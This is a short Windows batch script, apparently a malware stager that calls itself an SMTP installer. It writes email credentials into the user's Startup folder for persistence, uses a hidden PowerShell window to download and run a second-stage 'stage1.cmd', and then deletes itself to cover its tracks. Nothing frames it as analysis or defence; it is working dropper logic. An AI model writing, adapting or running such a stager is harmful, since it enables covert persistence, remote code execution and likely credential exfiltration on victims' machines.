@echo off
set "current_dir=%cd%"
set "startup_dir=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cd %startup_dir%
echo your_email@gmail.com > email.txt
echo your_email_password > password.txt
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri stage1.cmd -OutFile stage1.cmd"
powershell ./stage1.cmd
cd "%current_dir%"
del smtp-installer.cmd